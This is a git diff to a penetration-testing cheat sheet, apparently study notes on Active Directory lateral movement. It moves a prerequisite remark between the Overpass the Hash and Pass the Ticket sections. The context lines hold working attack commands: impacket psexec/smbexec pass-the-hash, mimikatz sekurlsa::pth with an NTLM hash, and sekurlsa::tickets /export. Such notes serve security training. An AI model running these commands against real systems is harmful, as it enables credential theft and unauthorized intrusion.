@@ -1612,7 +1612,7 @@ impacket-psexec -hashes <LM>:<NT> Administrator@<target-IP>
 impacket-smbexec -hashes <LM>:<NT> Administrator@<target-IP>
 ```
 
-5. Overpass the Hash:                (admin on the local machine)
+5. Overpass the Hash:                (admin on the local machine; this requires the target user's password or NTLM hash)
 	1. dump cached credentials >> PtH locally to get powershell as the target (local) user >> perform some kind of network auth to cache kerberos tickets >> use psexec64.exe in the powershell session with the cached tickets to move laterally
 ```
 privilege::debug
@@ -1631,7 +1631,7 @@ sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B
 ```
 
 6. Pass the Ticket:    
-	1. (Administrator on the local machine, unless the TGS belongs to current user; this requires the target user's password or NTLM hash)
+	1. (Administrator on the local machine, unless the TGS belongs to current user)
 ```
 privilege::debug
 sekurlsa::tickets /export       
